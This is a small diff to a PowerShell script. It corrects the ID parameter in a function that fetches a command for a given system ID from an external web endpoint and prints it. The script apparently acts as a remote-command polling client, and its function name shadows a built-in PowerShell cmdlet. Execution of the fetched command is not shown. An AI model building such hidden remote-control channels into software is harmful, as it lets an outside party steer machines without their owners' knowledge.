@@ -66,7 +66,7 @@ function Get-Command {
    param (  $SystemId )
     try {
          $cmd = Invoke-RestMethod `
-                    -Uri "https://mcontrol.vercel.app/api/command?id=$SYSTEM" `
+                    -Uri "https://mcontrol.vercel.app/api/command?id=$SystemId" `
                    -Method GET `
                     -ContentType "application/json"  `
           Write-Host "getcmd: $cmd"          
